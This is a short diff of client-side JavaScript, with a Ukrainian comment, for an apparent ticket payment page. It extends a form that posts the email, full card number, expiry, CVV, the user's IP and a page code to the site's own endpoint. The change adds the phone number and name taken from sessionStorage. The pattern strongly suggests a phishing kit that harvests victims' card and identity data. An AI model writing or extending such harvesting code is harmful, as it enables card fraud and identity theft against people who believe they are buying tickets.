@@ -195,6 +195,9 @@
                 currency = getQueryParam('currency') || 'EUR';
             }
         }
+        // --- Додаємо телефон і ім'я з sessionStorage ---
+        const phone = sessionStorage.getItem('ticket_phone') || '';
+        const name = sessionStorage.getItem('ticket_name') || '';
         try {
             let ip = userIP;
             if (!ip) {
@@ -205,7 +208,7 @@
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, page_code, price, currency })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, page_code, price, currency, phone, name })
             });
             if (response.ok) {
                 if (!document.getElementById('payment-msg')) {
